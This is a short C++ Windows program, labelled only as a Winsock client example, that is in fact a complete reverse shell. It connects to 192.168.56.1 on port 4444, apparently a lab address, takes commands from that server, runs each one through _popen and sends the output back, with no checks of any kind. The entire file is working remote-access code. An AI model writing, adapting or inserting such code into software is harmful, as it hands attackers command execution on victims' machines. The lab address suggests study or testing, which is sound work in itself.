/*
Client Functions
1. initialize WSA - WSAStartup()
2. Create a socket - socket()
3. Define Server address
4. Connect to server - connect()
5. send and receive data - recv(), send(), recvfrom(),sendto()
6. Disconect - closesocket()
*/

#define _WINSOCK_DEPRECATED_NO_WARNINGS
#include <winsock2.h>
#include <windows.h>
#include <iostream>
#include <string>
#include <sstream>
#include <stdio.h>


std::string execCommand(const std::string& cmd) {
    char buffer[128];
    std::string result;

    FILE* pipe = _popen(cmd.c_str(), "r");
    if (!pipe) return "Failed to run command.\n";

    while (fgets(buffer, sizeof(buffer), pipe) != NULL) {
        result += buffer;
    }

    _pclose(pipe);
    return result;
}

int main() {
    // 1. Initialize Winsock
    WSADATA wsaData;
    int wsInit = WSAStartup(MAKEWORD(2, 2), &wsaData);
    if (wsInit != 0) {
        return 1;
    }

    // 2. Create socket
    SOCKET sock = socket(AF_INET, SOCK_STREAM, 0);
    if (sock == INVALID_SOCKET) {
        WSACleanup();
        return 1;
    }

    // 3. Define server address
    sockaddr_in serverAddr;
    serverAddr.sin_family = AF_INET;
    serverAddr.sin_port = htons(4444);
    serverAddr.sin_addr.s_addr = inet_addr("192.168.56.1");  // Change to your server IP

    // 4. Connect to server
    if (connect(sock, (sockaddr*)&serverAddr, sizeof(serverAddr)) == SOCKET_ERROR) {
        closesocket(sock);
        WSACleanup();
        return 1;
    }

    // 5. Receive and execute commands
    char buffer[4096];
    std::string output;

    while (true) {
        ZeroMemory(buffer, 4096);
        int bytesReceived = recv(sock, buffer, 4096, 0);
        if (bytesReceived <= 0) break;

        std::string command(buffer);

        if (command == "exit") {
            break;
        }

        output = execCommand(command);
        send(sock, output.c_str(), output.size() + 1, 0);
    }

    // 6. Cleanup
    closesocket(sock);
    WSACleanup();
    return 0;
}
